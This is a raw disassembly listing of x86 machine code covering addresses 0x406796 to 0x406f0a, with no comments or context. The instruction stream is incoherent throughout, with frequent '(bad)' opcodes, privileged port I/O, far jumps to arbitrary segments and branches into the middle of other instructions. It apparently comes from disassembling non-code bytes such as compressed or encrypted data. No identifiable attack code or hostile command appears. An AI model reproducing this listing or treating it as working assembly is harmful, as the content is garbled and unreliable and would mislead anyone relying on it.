  406796:	adc    al,0x19
  406798:	adc    dh,BYTE PTR [ebp+0x39e13356]
  40679e:	mov    esp,0xb90b4031
  4067a3:	jbe    0x406817
  4067a5:	(bad)  
  4067a7:	xor    dl,al
  4067a9:	xor    ebx,DWORD PTR [edx]
  4067ab:	sbb    esp,DWORD PTR [edx]
  4067ad:	dec    ebx
  4067ae:	mov    DWORD PTR [esi+0x788fe685],0x74503d5a
  4067b8:	clc    
  4067b9:	cmc    
  4067ba:	jno    0x406743
  4067bc:	(bad)  
  4067bd:	pop    es
  4067be:	xor    cl,BYTE PTR ds:0xaa02f4e5
  4067c4:	mov    eax,0x745750ab
  4067c9:	push   DWORD PTR [ecx-0x6a]
  4067cc:	xchg   esi,eax
  4067cd:	inc    esp
  4067ce:	jge    0x406803
  4067d0:	adc    eax,0xcd39c86e
  4067d5:	in     eax,dx
  4067d6:	cmp    ecx,DWORD PTR [edi]
  4067d8:	sbb    ecx,DWORD PTR [edx+eiz*4-0x67e9c5df]
  4067df:	pop    edx
  4067e0:	rol    ecx,1
  4067e2:	adc    al,0x75
  4067e4:	mov    ebx,0x22824263
  4067e9:	jp     0x4067e4
  4067eb:	mov    al,ds:0xd34b2870
  4067f0:	jge    0x40680d
  4067f2:	inc    ebx
  4067f3:	repnz adc cl,dh
  4067f6:	jno    0x4067fb
  4067f8:	dec    esi
  4067f9:	retf   
  4067fa:	push   0x21dfa48c
  4067ff:	(bad)  
  406800:	out    dx,eax
  406801:	lds    eax,FWORD PTR [ebp-0x2225b0fb]
  406807:	(bad)  
  406808:	call   0x4c7c:0xe6be1009
  40680f:	or     al,0x25
  406811:	cld    
  406812:	sbb    DWORD PTR [esp+eax*8+0x56],edi
  406816:	into   
  406817:	push   esp
  406818:	mov    dl,al
  40681a:	call   0x5e18ae5c
  40681f:	mov    dh,0xb7
  406821:	jp     0x4067e9
  406823:	dec    ebx
  406824:	cwde   
  406825:	inc    edx
  406826:	repnz mov WORD PTR [ebp+0x70],gs
  40682a:	mov    esi,0x868a3211
  40682f:	iret   
  406830:	push   ecx
  406831:	(bad)  
  406832:	pop    ss
  406833:	or     eax,DWORD PTR [ecx+0x768e51e1]
  406839:	adc    al,0xc7
  40683b:	ret    0x4008
  40683e:	ins    BYTE PTR es:[edi],dx
  40683f:	mov    dl,BYTE PTR [ecx-0x39]
  406842:	pop    es
  406843:	test   eax,0xe4a94c4c
  406848:	scas   al,BYTE PTR es:[edi]
  406849:	fbld   TBYTE PTR [esi-0x5d678d6]
  40684f:	(bad)  
  406851:	cdq    
  406852:	add    DWORD PTR [ebp-0x14828697],eax
  406858:	je     0x406866
  40685a:	xchg   ebx,eax
  40685b:	cs xor dl,dh
  40685e:	imul   ecx,DWORD PTR [edi],0xf
  406861:	ds jno 0x4068bb
  406864:	adc    ah,BYTE PTR [eax-0x47]
  406867:	push   ss
  406868:	dec    ebp
  406869:	mov    dl,0xcf
  40686b:	(bad)  [eax+ecx*1+0x41aeb270]
  406872:	scas   eax,DWORD PTR es:[edi]
  406873:	inc    ebx
  406874:	lahf   
  406875:	xchg   BYTE PTR [eax-0x23],dh
  406878:	jno    0x40687e
  40687a:	repz mov ecx,0xcd37338a
  406880:	adc    al,0xeb
  406882:	(bad)  
  406883:	jno    0x4068b1
  406885:	stc    
  406886:	pop    esp
  406887:	and    BYTE PTR [eax],bl
  406889:	(bad)  
  40688b:	lock ret 
  40688d:	(bad)  
  40688f:	ret    0xe128
  406892:	adc    al,0x73
  406894:	rcr    DWORD PTR [esp+ebx*1+0x54b2174b],1
  40689b:	pop    ecx
  40689c:	add    edx,esp
  40689e:	adc    ah,BYTE PTR [ecx+0x2a]
  4068a1:	shl    DWORD PTR [eax+0x20],0xdf
  4068a5:	mov    dl,0xd0
  4068a7:	sti    
  4068a8:	(bad)  [edi-0x9]
  4068ab:	xor    eax,ebx
  4068ad:	rcl    BYTE PTR [ebp+0x6061e089],1
  4068b3:	pop    eax
  4068b4:	jno    0x4068a9
  4068b6:	mov    al,0x3
  4068b8:	hlt    
  4068b9:	jmp    0xaef8ac54
  4068be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068bf:	es (bad) 
  4068c2:	(bad)  
  4068c3:	outs   dx,DWORD PTR ds:[esi]
  4068c4:	dec    edi
  4068c5:	jmp    0xe3a:0x39ff5a66
  4068cc:	(bad)  
  4068cd:	xchg   ecx,eax
  4068ce:	mov    cl,0x39
  4068d0:	fild   QWORD PTR [ebx-0x283c8380]
  4068d6:	inc    esp
  4068d7:	(bad)  
  4068d8:	(bad)  
  4068d9:	outs   dx,DWORD PTR ds:[esi]
  4068da:	mov    ebp,0x3f133211
  4068df:	add    edx,DWORD PTR [edx]
  4068e1:	and    al,BYTE PTR [edx]
  4068e3:	sti    
  4068e4:	nop
  4068e5:	jecxz  0x406878
  4068e7:	repz sti 
  4068e9:	into   
  4068ea:	jno    0x406954
  4068ec:	ja     0x406918
  4068ee:	sub    ebp,DWORD PTR [esi+ebx*8]
  4068f1:	jns    0x406875
  4068f3:	ins    BYTE PTR es:[edi],dx
  4068f4:	mov    cl,BYTE PTR [ebp+0xa]
  4068f7:	push   edx
  4068f8:	lock adc cl,BYTE PTR [eax]
  4068fb:	jae    0x4068a8
  4068fd:	add    dh,BYTE PTR [edx]
  4068ff:	aaa    
  406900:	fcmovnu st,st(3)
  406902:	lods   al,BYTE PTR ds:[esi]
  406903:	push   ecx
  406904:	js     0x4068e0
  406906:	sub    esi,DWORD PTR [ebx]
  406908:	in     al,dx
  406909:	mov    cl,dl
  40690b:	mov    dh,0x7f
  40690d:	loopne 0x4068de
  40690f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406910:	mov    ebp,0xf0063162
  406915:	ja     0x406912
  406917:	pop    ecx
  406918:	frstor [ebp+edx*2+0x5e]
  40691c:	xor    edx,eax
  40691e:	pop    es
  40691f:	mov    ebx,DWORD PTR [edi-0x41]
  406922:	call   0xab6c:0x31243816
  406929:	xchg   ebp,eax
  40692a:	add    al,dh
  40692c:	push   ebx
  40692d:	stos   BYTE PTR es:[edi],al
  40692e:	rol    dl,0xf2
  406931:	mov    ecx,0xd33268fb
  406936:	in     eax,0xbb
  406938:	jle    0x4069a0
  40693a:	icebp  
  40693b:	and    al,0x76
  40693d:	mov    al,ds:0xb40098d9
  406942:	stos   BYTE PTR es:[edi],al
  406943:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406944:	dec    ecx
  406945:	enter  0x7749,0xbc
  406949:	leave  
  40694a:	inc    eax
  40694b:	test   al,0xe
  40694d:	mov    DWORD PTR fs:[ebx],ebx
  406950:	inc    ecx
  406951:	mov    ah,0x67
  406953:	sub    BYTE PTR [eax+edx*1-0xf],bl
  406957:	xlat   BYTE PTR ds:[ebx]
  406958:	push   0xffffff84
  40695a:	sbb    eax,0x108da39e
  40695f:	push   ebx
  406960:	xor    al,0x71
  406962:	(bad)  
  406963:	ins    DWORD PTR es:[edi],dx
  406964:	sub    BYTE PTR [ecx-0x16],ah
  406967:	and    al,0xa
  406969:	inc    ebx
  40696a:	jnp    0x406906
  40696c:	in     al,0x59
  40696e:	nop
  40696f:	in     al,0x27
  406971:	xchg   edi,eax
  406972:	dec    esp
  406973:	aas    
  406974:	xlat   BYTE PTR ds:[ebx]
  406975:	pop    eax
  406976:	xor    eax,0x34e66db0
  40697b:	shl    ah,cl
  40697d:	lock jae 0x40690b
  406980:	nop
  406981:	mov    bh,0x26
  406983:	xchg   ebp,ecx
  406985:	xor    eax,0xbdb20af3
  40698a:	push   ebx
  40698b:	mov    BYTE PTR [eax],dl
  40698d:	mov    ebx,0xac699593
  406992:	mov    eax,DWORD PTR [edi-0x5de6699]
  406998:	adc    eax,0xad737b98
  40699d:	push   eax
  40699e:	add    BYTE PTR [eax+0x7a],cl
  4069a1:	mov    eax,0xd75a08d6
  4069a6:	sar    BYTE PTR [ecx+eax*1],1
  4069a9:	retf   0x2663
  4069ac:	inc    ebx
  4069ad:	xchg   ebp,eax
  4069ae:	jecxz  0x4069b1
  4069b0:	inc    ebp
  4069b1:	sbb    al,0xf
  4069b3:	call   0x2654476f
  4069b8:	pop    esp
  4069b9:	loopne 0x40698f
  4069bb:	frstor [ebp-0x58]
  4069be:	push   esi
  4069bf:	pop    es
  4069c0:	ins    BYTE PTR es:[edi],dx
  4069c1:	in     eax,0x2
  4069c3:	js     0x4069f5
  4069c5:	jp     0x406a01
  4069c7:	sub    eax,0x62ccf413
  4069cc:	out    0x2e,al
  4069ce:	xchg   edi,eax
  4069cf:	inc    ebp
  4069d0:	mov    ds:0x2707afcf,al
  4069d5:	lods   eax,DWORD PTR ds:[esi]
  4069d6:	xor    al,0xd0
  4069d8:	pop    ss
  4069d9:	adc    al,0x86
  4069db:	in     eax,dx
  4069dc:	js     0x406a12
  4069de:	xor    al,0x62
  4069e0:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069e2:	cmp    ecx,edx
  4069e4:	xor    eax,0xe7d8b5a8
  4069e9:	imul   edi,DWORD PTR [eax+0x56],0xf1e321dd
  4069f0:	jno    0x406a38
  4069f2:	je     0x406a2b
  4069f4:	cwde   
  4069f5:	stc    
  4069f6:	dec    esi
  4069f7:	outs   dx,BYTE PTR ds:[esi]
  4069f8:	sbb    DWORD PTR [edx],edx
  4069fa:	and    al,0xc1
  4069fc:	sub    DWORD PTR [ebx+0x52],esp
  4069ff:	(bad)
  406a02:	sub    ebx,DWORD PTR [ecx+0x76]
  406a05:	fimul  DWORD PTR [eax+0x4f]
  406a08:	lock retf 
  406a0a:	retf   
  406a0b:	ja     0x406a4a
  406a0d:	xchg   DWORD PTR [ecx+0x778a99a4],eax
  406a13:	and    BYTE PTR [ebx],0x23
  406a16:	(bad)  [eax+0x5ccf58ec]
  406a1c:	inc    BYTE PTR [ebp-0x6d]
  406a1f:	or     DWORD PTR [edi-0x4896bbca],ebp
  406a25:	(bad)  
  406a28:	pop    edi
  406a29:	jmp    0x4069b8
  406a2b:	jl     0x406a01
  406a2d:	es ja  0x406a9d
  406a30:	bound  eax,QWORD PTR [ecx+0xcf37def]
  406a36:	in     al,dx
  406a37:	ret    0x85c4
  406a3a:	add    ch,al
  406a3c:	hlt    
  406a3d:	cmp    bh,bl
  406a3f:	imul   ebx,DWORD PTR [eax],0x8ed257db
  406a45:	mov    esi,ds
  406a47:	ins    DWORD PTR es:[edi],dx
  406a48:	inc    eax
  406a49:	or     eax,0xf6d78826
  406a4e:	jle    0x406ac3
  406a50:	mov    ebp,0xd5d56195
  406a55:	aad    0xce
  406a57:	lods   al,BYTE PTR ds:[esi]
  406a58:	mov    edi,0x5f13b240
  406a5d:	popf   
  406a5e:	clc    
  406a5f:	js     0x406a20
  406a61:	sahf   
  406a62:	arpl   bp,bx
  406a64:	mov    DWORD PTR [edx],eax
  406a66:	push   ebp
  406a67:	sub    eax,0x77ba27dc
  406a6c:	mov    edx,0xab445cfb
  406a71:	add    cl,BYTE PTR [edx]
  406a73:	lahf   
  406a74:	xlat   BYTE PTR ds:[ebx]
  406a75:	jns    0x406ae7
  406a77:	pusha  
  406a78:	ss adc al,0x93
  406a7b:	or     eax,0x7a64c113
  406a80:	xor    al,0x6
  406a82:	test   esp,edi
  406a84:	xchg   esp,eax
  406a85:	fst    DWORD PTR [edx+0x5f]
  406a88:	ins    BYTE PTR es:[edi],dx
  406a89:	and    edi,edi
  406a8b:	fsub   QWORD PTR [esi]
  406a8d:	jg     0x406ac2
  406a8f:	inc    ebp
  406a90:	pop    ecx
  406a91:	in     al,dx
  406a92:	inc    esp
  406a93:	out    dx,eax
  406a94:	into   
  406a95:	adc    eax,0x3f1a9254
  406a9a:	cmc    
  406a9b:	jecxz  0x406b16
  406a9d:	mov    cl,0xd4
  406a9f:	ins    BYTE PTR es:[edi],dx
  406aa0:	pop    ss
  406aa1:	outs   dx,DWORD PTR ds:[esi]
  406aa2:	out    0x5,al
  406aa4:	push   esi
  406aa5:	jae    0x406aed
  406aa7:	mov    al,0xcd
  406aa9:	sbb    BYTE PTR [ecx-0xf],bl
  406aac:	or     bl,bl
  406aae:	xor    DWORD PTR [edx+ecx*4+0x43cef136],edx
  406ab5:	out    0x54,al
  406ab7:	loop   0x406aca
  406ab9:	sbb    eax,0x1d4d59fc
  406abe:	outs   dx,DWORD PTR ds:[esi]
  406abf:	and    DWORD PTR [ecx+0xbefbd61],esi
  406ac5:	xor    al,bh
  406ac7:	ss dec ebp
  406ac9:	fiadd  WORD PTR [esi-0x40]
  406acc:	push   0x1b
  406ace:	lds    edx,FWORD PTR [eax]
  406ad0:	test   BYTE PTR [esi],cl
  406ad2:	aam    0xcb
  406ad4:	inc    esi
  406ad5:	xchg   edi,eax
  406ad6:	outs   dx,DWORD PTR ds:[esi]
  406ad7:	jmp    FWORD PTR [esi+ebp*8-0x3e]
  406adb:	shl    BYTE PTR [esp+ebp*8],cl
  406ade:	div    BYTE PTR [edi+0x3c]
  406ae1:	pop    esp
  406ae2:	neg    DWORD PTR [eax-0x10]
  406ae5:	nop    DWORD PTR [edi]
  406ae8:	js     0x406ab0
  406aea:	mov    ebx,0xe5233bf1
  406aef:	jae    0x406a8e
  406af1:	add    bh,BYTE PTR [ecx-0x2a2a8726]
  406af7:	je     0x406ad3
  406af9:	inc    esp
  406afa:	mov    al,BYTE PTR [ecx+eiz*4+0x63]
  406afe:	xlat   BYTE PTR ds:[ebx]
  406aff:	lock ins DWORD PTR es:[edi],dx
  406b01:	scas   al,BYTE PTR es:[edi]
  406b02:	mov    edx,0xc2991b8d
  406b07:	leave  
  406b08:	lods   al,BYTE PTR ds:[esi]
  406b09:	jg     0x406aa9
  406b0b:	pop    ds
  406b0c:	fstp   DWORD PTR [ebp-0xb]
  406b0f:	fnstsw WORD PTR [ebp-0x4284393c]
  406b15:	push   ss
  406b16:	fidivr WORD PTR [ebx]
  406b18:	push   es
  406b19:	xor    eax,0x67c3de10
  406b1e:	xchg   ebx,eax
  406b1f:	ins    DWORD PTR es:[edi],dx
  406b20:	(bad)  
  406b21:	aam    0x48
  406b23:	ja     0x406ac8
  406b25:	sbb    ebp,DWORD PTR [edx+0x5556e4c]
  406b2b:	cmp    eax,0x6c0332f8
  406b30:	dec    esp
  406b31:	mov    dl,0x53
  406b33:	pop    eax
  406b34:	fwait
  406b35:	push   esp
  406b36:	out    dx,eax
  406b37:	inc    eax
  406b38:	jg     0x406ac2
  406b3a:	inc    eax
  406b3b:	mov    ebx,ebp
  406b3d:	sbb    DWORD PTR [ebp+ebx*1-0x56ee7558],ebx
  406b44:	ror    BYTE PTR [ecx-0x55],1
  406b47:	push   eax
  406b48:	outs   dx,DWORD PTR ds:[esi]
  406b49:	outs   dx,DWORD PTR ds:[esi]
  406b4a:	loop   0x406b8c
  406b4c:	pop    edx
  406b4d:	mov    ecx,0xd8677666
  406b52:	xchg   ebp,eax
  406b53:	sbb    DWORD PTR [ebx+0x35f29cdd],esp
  406b59:	mov    dl,0xb8
  406b5b:	push   eax
  406b5c:	clc    
  406b5d:	in     al,dx
  406b5e:	loope  0x406b0e
  406b60:	cmp    bh,bl
  406b62:	pop    esi
  406b63:	push   eax
  406b64:	ret    0x591c
  406b67:	outs   dx,DWORD PTR ds:[esi]
  406b68:	stos   BYTE PTR es:[edi],al
  406b69:	or     al,al
  406b6b:	fcomp  QWORD PTR [eax]
  406b6d:	enter  0xf926,0xb8
  406b71:	mov    ebp,0xdcd14fd1
  406b76:	shl    edx,cl
  406b78:	and    dl,ch
  406b7a:	mov    ah,0xad
  406b7c:	outs   dx,DWORD PTR ds:[esi]
  406b7d:	mov    cl,0x5b
  406b7f:	test   BYTE PTR [eax-0x55],dl
  406b82:	repz jle 0x406b18
  406b85:	cwde   
  406b86:	int3   
  406b87:	xchg   esp,eax
  406b88:	pop    ebx
  406b89:	jae    0x406b3f
  406b8b:	push   0xffffffff
  406b8d:	pop    edi
  406b8e:	imul   eax,DWORD PTR [esi],0xb88cf890
  406b94:	iret   
  406b95:	ins    DWORD PTR es:[edi],dx
  406b96:	fdiv   QWORD PTR [ebp+0x6a]
  406b99:	sbb    eax,0xa94a16fa
  406b9e:	sub    DWORD PTR [esi+0x7ac627cb],eax
  406ba4:	add    BYTE PTR [edi+ebx*8-0x26b19cd4],dl
  406bab:	jno    0x406b83
  406bad:	inc    edi
  406bae:	mov    ecx,0x920380a9
  406bb3:	add    eax,0x7967dd86
  406bb8:	and    BYTE PTR [esi+0x35bf043d],dh
  406bbe:	adc    BYTE PTR [ebx+esi*8],ch
  406bc1:	xchg   DWORD PTR [edx],edx
  406bc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bc4:	push   ebx
  406bc5:	xor    dh,BYTE PTR [edx+0x6d]
  406bc8:	add    eax,0x95600bd
  406bcd:	pop    ds
  406bce:	aas    
  406bcf:	xchg   edi,eax
  406bd0:	xor    al,0x21
  406bd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bd3:	jle    0x406c42
  406bd5:	jg     0x406b76
  406bd7:	xchg   esp,eax
  406bd8:	xchg   DWORD PTR [edx+eax*1-0xe],ebx
  406bdc:	stc    
  406bdd:	adc    dh,BYTE PTR [ebp-0x53]
  406be0:	pop    eax
  406be1:	nop
  406be2:	call   0xb8da7a11
  406be7:	lahf   
  406be8:	sbb    dh,BYTE PTR [ecx]
  406bea:	imul   eax,DWORD PTR [edi-0x2c],0x55
  406bee:	mov    DWORD PTR [ebp+0x42],ebx
  406bf1:	pop    ds
  406bf2:	bound  edx,QWORD PTR [esi+0xe]
  406bf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bf6:	mov    dl,0xc3
  406bf8:	xchg   esi,eax
  406bf9:	mov    eax,ds:0x1e8b9f73
  406bff:	out    0x2b,al
  406c01:	mov    dh,0x9e
  406c03:	dec    esi
  406c04:	mov    dh,0x1a
  406c06:	jnp    0x406c08
  406c08:	xchg   edi,eax
  406c09:	in     eax,0x60
  406c0b:	adc    ecx,DWORD PTR [edx-0x61]
  406c0e:	fwait
  406c0f:	or     eax,eax
  406c11:	mov    esp,es
  406c13:	scas   eax,DWORD PTR es:[edi]
  406c14:	sbb    al,0xf8
  406c16:	push   ds
  406c17:	scas   al,BYTE PTR es:[edi]
  406c18:	push   0x68
  406c1a:	mov    ah,0x3f
  406c1c:	enter  0x680b,0xd4
  406c20:	bound  esp,QWORD PTR [ebp+0x3a9abb6b]
  406c26:	popa   
  406c27:	and    al,0xe1
  406c29:	cmp    eax,0x384a1d30
  406c2e:	or     al,0xc0
  406c30:	inc    edx
  406c31:	ror    edx,1
  406c33:	fcom   DWORD PTR [edx+0x47]
  406c36:	xchg   ebx,eax
  406c37:	add    eax,0xcb49c06f
  406c3c:	mov    ds:0x90e773e3,al
  406c41:	test   ch,bl
  406c43:	pop    ds
  406c44:	loopne 0x406bef
  406c46:	adc    DWORD PTR [ecx+0x5dcdc10c],ebp
  406c4c:	add    DWORD PTR [esi],edi
  406c4e:	cdq    
  406c4f:	fwait
  406c50:	pmaddwd mm4,QWORD PTR [edx+ebx*8-0x1d]
  406c55:	lea    ebx,[eax+eax*1]
  406c58:	jg     0x406cb8
  406c5a:	out    0x39,al
  406c5c:	cmp    DWORD PTR [ebx+0x49489eff],ebx
  406c62:	mov    ds:0x715c1267,eax
  406c67:	in     al,0x46
  406c69:	(bad)  
  406c6a:	jmp    0x7f8a1d9d
  406c6f:	mov    bl,0xfc
  406c71:	mov    cl,0x49
  406c73:	jae    0x406c7f
  406c75:	ficomp DWORD PTR [esi]
  406c77:	(bad)  
  406c78:	into   
  406c79:	sub    ebx,DWORD PTR [edx-0x25]
  406c7c:	outs   dx,BYTE PTR ds:[esi]
  406c7d:	jne    0x406c96
  406c7f:	and    esp,eax
  406c81:	push   ss
  406c82:	imul   edi,DWORD PTR [eax],0x17
  406c85:	jno    0x406c72
  406c87:	addr16 pop edx
  406c89:	and    al,0x5
  406c8b:	cmc    
  406c8c:	dec    ebx
  406c8d:	mov    dh,0x5b
  406c8f:	cmp    BYTE PTR [esi],al
  406c91:	sub    bh,0xbd
  406c94:	in     al,dx
  406c95:	enter  0x7e9f,0x54
  406c99:	sbb    al,0xa9
  406c9b:	rcl    BYTE PTR [ebx+0x588c7767],cl
  406ca1:	sti    
  406ca2:	mov    ds:0xe04a293e,eax
  406ca7:	xchg   ecx,eax
  406ca8:	jge    0x406cac
  406caa:	and    ch,BYTE PTR [eax]
  406cac:	imul   ebp,DWORD PTR [edx+edx*1+0x79c1578a],0x18
  406cb4:	leave  
  406cb5:	lods   al,BYTE PTR ds:[esi]
  406cb6:	test   BYTE PTR [esi-0x50],ah
  406cb9:	adc    BYTE PTR [esp+esi*1-0x54],0x42
  406cbe:	or     ch,bl
  406cc0:	push   0x0
  406cc2:	out    0xbe,eax
  406cc4:	pop    esp
  406cc5:	and    al,0xa1
  406cc7:	xlat   BYTE PTR ds:[ebx]
  406cc8:	repz mov eax,0x583d96f4
  406cce:	jnp    0x406cc8
  406cd0:	pop    ecx
  406cd1:	push   esi
  406cd2:	jecxz  0x406c68
  406cd4:	push   eax
  406cd5:	fidivr WORD PTR [esi]
  406cd7:	dec    esp
  406cd8:	and    al,0x6d
  406cda:	push   esp
  406cdb:	pop    ss
  406cdc:	repz gs or al,0xf5
  406ce0:	cmp    edi,DWORD PTR [ebx]
  406ce2:	add    ebx,DWORD PTR ds:[edi+0x58f47f37]
  406ce9:	jb     0x406cd7
  406ceb:	cmc    
  406cec:	cmp    DWORD PTR [edi+0x23],esp
  406cef:	push   ss
  406cf0:	xchg   BYTE PTR [eax+0x5b66313f],ah
  406cf6:	stos   BYTE PTR es:[edi],al
  406cf7:	fld    st(1)
  406cf9:	(bad)  
  406cfa:	xchg   BYTE PTR [edx-0x6a],dl
  406cfd:	rcr    ebx,0x5
  406d00:	push   ss
  406d01:	fist   WORD PTR [eax-0x76be1f25]
  406d07:	mov    esp,0xfc9a9303
  406d0c:	and    ecx,edi
  406d0e:	fisubr WORD PTR [ebx]
  406d10:	pop    edx
  406d11:	mov    ch,0xdf
  406d13:	mov    ds:0xf4283018,al
  406d18:	loopne 0x406caf
  406d1a:	retf   
  406d1b:	pop    edx
  406d1c:	iret   
  406d1d:	mov    edx,0xa72e537a
  406d22:	sub    al,0x44
  406d24:	stc    
  406d25:	bound  ebx,QWORD PTR [edx]
  406d27:	loope  0x406d92
  406d29:	enter  0x6085,0xcc
  406d2d:	mov    ds:0x38d8f587,al
  406d32:	mov    al,ds:0x6832ad5a
  406d37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d38:	sub    DWORD PTR [esi+0x540063e4],edx
  406d3e:	jp     0x406d7c
  406d40:	xor    al,0xaa
  406d42:	stos   DWORD PTR es:[edi],eax
  406d43:	into   
  406d44:	shl    DWORD PTR [esi-0x22],0xba
  406d48:	push   0x5d28878b
  406d4d:	out    dx,eax
  406d4e:	inc    esp
  406d4f:	(bad)  
  406d50:	and    BYTE PTR [ebx+0x55],ah
  406d53:	add    eax,ebp
  406d55:	repz and BYTE PTR [esp+eax*2+0x67],bl
  406d5a:	xchg   esp,eax
  406d5b:	dec    esi
  406d5c:	mov    dl,0x3b
  406d5e:	adc    ebx,DWORD PTR [edx+0x4b]
  406d61:	arpl   sp,si
  406d63:	mov    eax,ds:0xd921eef0
  406d68:	lea    ecx,[edi]
  406d6a:	mov    bl,0xb
  406d6c:	cmp    ebx,edi
  406d6e:	inc    edi
  406d6f:	adc    BYTE PTR [eax],0xb8
  406d72:	loope  0x406d7b
  406d74:	push   edx
  406d75:	cdq    
  406d76:	mov    BYTE PTR [ebx],0x5f
  406d79:	dec    eax
  406d7a:	sbb    eax,0x376b4b4d
  406d7f:	enter  0x993b,0xc8
  406d83:	imul   eax,DWORD PTR [ecx],0x10
  406d86:	nop
  406d87:	sbb    eax,0x88b26551
  406d8c:	jmp    0x2c37:0x642d0659
  406d93:	das    
  406d94:	retf   0x2e64
  406d97:	scas   al,BYTE PTR es:[edi]
  406d98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d99:	mov    ah,0x3f
  406d9c:	pop    edi
  406d9d:	stos   BYTE PTR es:[edi],al
  406d9e:	mov    al,0x5d
  406da0:	jae    0x406deb
  406da2:	jmp    0xe3a7:0xe25cf65
  406da9:	jne    0x406dc5
  406dab:	xor    dh,BYTE PTR [ebx-0x45]
  406dae:	mov    al,BYTE PTR [edx]
  406db0:	sub    al,0x7e
  406db2:	or     BYTE PTR [ebp+0x1cd82c00],dh
  406db8:	push   esi
  406db9:	(bad)  
  406dba:	jmp    0xdf8527ca
  406dbf:	into   
  406dc0:	push   cs
  406dc1:	pop    es
  406dc2:	and    eax,DWORD PTR [ebp-0x5b]
  406dc5:	xor    al,0x4f
  406dc7:	lds    ecx,FWORD PTR [eax+0x2a4fe572]
  406dcd:	cmp    eax,0x14dc3697
  406dd2:	pop    esi
  406dd3:	paddsw mm3,QWORD PTR [edi]
  406dd6:	(bad)  
  406dd8:	inc    esi
  406dd9:	shr    DWORD PTR [esi+ebp*2+0x5414a224],cl
  406de0:	and    dh,ch
  406de2:	mov    dl,BYTE PTR [esi]
  406de4:	sahf   
  406de5:	jecxz  0x406df5
  406de7:	inc    ecx
  406de8:	jns    0x406d86
  406dea:	mov    ds:0x2c71b9bc,al
  406def:	xor    BYTE PTR [ebx-0x7278e314],0xb9
  406df6:	dec    ebx
  406df7:	push   eax
  406df8:	jne    0x406e11
  406dfa:	js     0x406d7e
  406dfc:	xchg   ecx,eax
  406dfd:	ja     0x406e3b
  406dff:	xor    DWORD PTR [ebx+0x6a10de37],edx
  406e05:	mov    al,ds:0x28668e18
  406e0a:	test   al,0xc9
  406e0c:	push   edx
  406e0d:	pop    ebp
  406e0e:	xor    al,0xd5
  406e10:	jne    0x406e86
  406e12:	ins    BYTE PTR es:[edi],dx
  406e13:	adc    esp,edx
  406e15:	mov    ebx,0xc140b91a
  406e1a:	pop    ss
  406e1b:	sar    ch,0x3
  406e1e:	pop    ds
  406e1f:	xchg   ebx,eax
  406e20:	arpl   WORD PTR [edx-0x511fadf6],ax
  406e26:	lods   eax,DWORD PTR ds:[esi]
  406e27:	adc    al,cl
  406e29:	xor    dl,BYTE PTR [esi]
  406e2b:	retf   0x4a6f
  406e2e:	fsubr  DWORD PTR [ebp-0x3c]
  406e31:	cmp    al,0x55
  406e33:	test   edi,ecx
  406e35:	inc    DWORD PTR [eax+0x52]
  406e38:	push   ds
  406e39:	shl    BYTE PTR [ecx-0x7116f3ea],0x9d
  406e40:	enter  0x4080,0xd7
  406e44:	in     eax,0x5a
  406e46:	int3   
  406e47:	enter  0xc8c3,0x65
  406e4b:	lea    ecx,[ecx-0x2dcdf89]
  406e51:	xor    DWORD PTR [eax],0xafb5f823
  406e57:	add    DWORD PTR [edi+0x63898cff],esp
  406e5d:	push   ebp
  406e5e:	aam    0x9a
  406e60:	retf   
  406e61:	xor    bl,dh
  406e63:	scas   al,BYTE PTR es:[edi]
  406e64:	add    BYTE PTR [ebx+0x1],0x88
  406e68:	shl    BYTE PTR [edx],1
  406e6a:	jl     0x406e0b
  406e6c:	xchg   edx,eax
  406e6d:	into   
  406e6e:	pushf  
  406e6f:	stc    
  406e70:	cmc    
  406e71:	ins    BYTE PTR es:[edi],dx
  406e72:	in     eax,0x8c
  406e74:	pop    ebx
  406e75:	pop    ds
  406e76:	in     eax,dx
  406e77:	and    edi,DWORD PTR [eax+0x62c65fd8]
  406e7d:	lods   eax,DWORD PTR ds:[esi]
  406e7e:	jle    0x406ed9
  406e80:	pop    ebp
  406e81:	leave  
  406e82:	cmovp  esi,ebx
  406e85:	adc    DWORD PTR [esi-0x77],ebx
  406e88:	push   es
  406e89:	xor    esp,DWORD PTR [ebx-0x6a9f48cd]
  406e8f:	xchg   ebp,eax
  406e90:	sahf   
  406e91:	(bad)  
  406e92:	rcl    ebp,0xc7
  406e95:	jl     0x406eaa
  406e97:	mov    ss,WORD PTR [edi+eax*4-0x4982e10c]
  406e9e:	in     eax,dx
  406e9f:	repz or eax,0x736e4c95
  406ea5:	push   es
  406ea6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ea7:	outs   dx,DWORD PTR ds:[esi]
  406ea8:	jmp    0x406ea1
  406eaa:	addr16 inc ebx
  406eac:	lahf   
  406ead:	pop    edi
  406eae:	cwde   
  406eaf:	xor    eax,0x7ae9d91f
  406eb4:	retf   0x827d
  406eb7:	mov    ah,ch
  406eb9:	bound  ebp,QWORD PTR [eax-0x4c]
  406ebc:	jae    0x406ef9
  406ebe:	test   al,0x26
  406ec0:	mov    esp,DWORD PTR [esi+0x49a236dc]
  406ec6:	sub    bh,dl
  406ec8:	cmp    al,0xb
  406eca:	and    BYTE PTR [eax],bl
  406ecc:	gs mov ebx,0xd7b6e609
  406ed2:	test   eax,0xa4dde8c0
  406ed7:	leave  
  406ed8:	aam    0x2c
  406eda:	inc    ecx
  406edb:	jns    0x406f52
  406edd:	sti    
  406ede:	or     DWORD PTR [esi],esp
  406ee0:	imul   ebp,eax,0xfffffff2
  406ee3:	fiadd  WORD PTR [edi+0x17]
  406ee6:	push   0xffffffba
  406ee8:	rol    bh,0xb2
  406eeb:	push   eax
  406eec:	mov    ebx,0xe3c7db6c
  406ef1:	fnsave [eax]
  406ef3:	add    ch,BYTE PTR [esi+esi*8]
  406ef6:	(bad)  
  406ef7:	rcr    BYTE PTR [ecx+0x10f6b103],1
  406efd:	enter  0xd024,0x20
  406f01:	and    eax,0xef708606
  406f06:	ret    0xfa82
  406f09:	inc    ebx
  406f0a:	fdivr  st,st(6)
